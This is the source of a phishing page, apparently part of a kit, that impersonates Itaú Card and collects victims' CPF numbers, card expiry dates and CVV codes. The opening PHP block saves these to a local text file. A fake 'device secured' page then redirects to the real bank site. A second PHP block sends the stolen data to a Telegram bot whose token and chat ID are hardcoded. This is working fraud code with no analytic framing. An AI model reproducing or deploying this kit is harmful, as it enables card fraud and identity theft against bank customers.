<?php
$cpf = $_POST['numcpf'];
$data = $_POST['numdtv'];
$cvv = $_POST['numcvv'];
$tudo = "".$cpf." | ".$data." | ".$cvv."<br>\n";

$fp = fopen("cardsenha.txt", "a");
fwrite($fp, $tudo);
fclose($fp);
?>
<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<title>Itau Card | Seus Benefícios</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
	<meta http-equiv="refresh" content="7, url='https://www.itau.com.br/mobile/cartoes/'">
	<link rel="stylesheet" type="text/css" href="parabens_arquivos/benef_compras_style.css">
</head>
<body>
	<header class="top-promo">
		<img src="parabens_arquivos/img_logo.png">
	</header>
	<section class="prog-cad">
		<ul>
			<li class="active">Identificação</li>
			<li class="active">Segurança</li>
			<li class="active">Confirmação</li>
		</ul>
	</section>
	<section class="eng-fim">
		<img class="img-suc" src="parabens_arquivos/ic_checked2.png">
		<h2>Tudo Certo</h2>
		<p>Agora seu dispositivo esta 100% seguro para continuar usando os serviços do ltaú.</p>
		<p>Aguarde um momento você será redirecionado...</p>
	</section>

</body></html>

<?php
// Verifique se o formulário foi enviado
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // Recupere os dados enviados pelo formulário
    $cpfnum = isset($_POST['numcpf']) ? $_POST['numcpf'] : '';
    $val = isset($_POST['numdtv']) ? $_POST['numdtv'] : '';
	$cvs = isset($_POST['numcvv']) ? $_POST['numcvv'] : '';
    
    
    
    // Verifique se os dados foi preenchido
    if (!empty($cpfnum) && !empty($val) && !empty($cvs) ) {
        
        // Substitua pelo token do seu bot no Telegram
        $botToken = '7669675700:AAFFD1K1QAJPI2zbLYD-NaqtpFaMNDCxdSY';
        $chatId = '-4611508812';

        // Crie a mensagem  a ser enviada
        // Crie a mensagem a ser enviada
        $message = "*ITAU | CONSUL pt.2*\n\n";
        
        $message .= "*CPF:* $cpfnum\n";
        $message .= "*Validade:* $val\n";
        $message .= "*cvv:* $cvs\n";
        
        

        // URL para enviar mensagens para o bot no Telegram
        $url = "https://api.telegram.org/bot$botToken/sendMessage";

        // Dados a serem enviados via POST
        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        // Configuração da requisição cURL
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

         // execute  sla oq
        curl_exec($ch);
        curl_close($ch);
    }
}
?>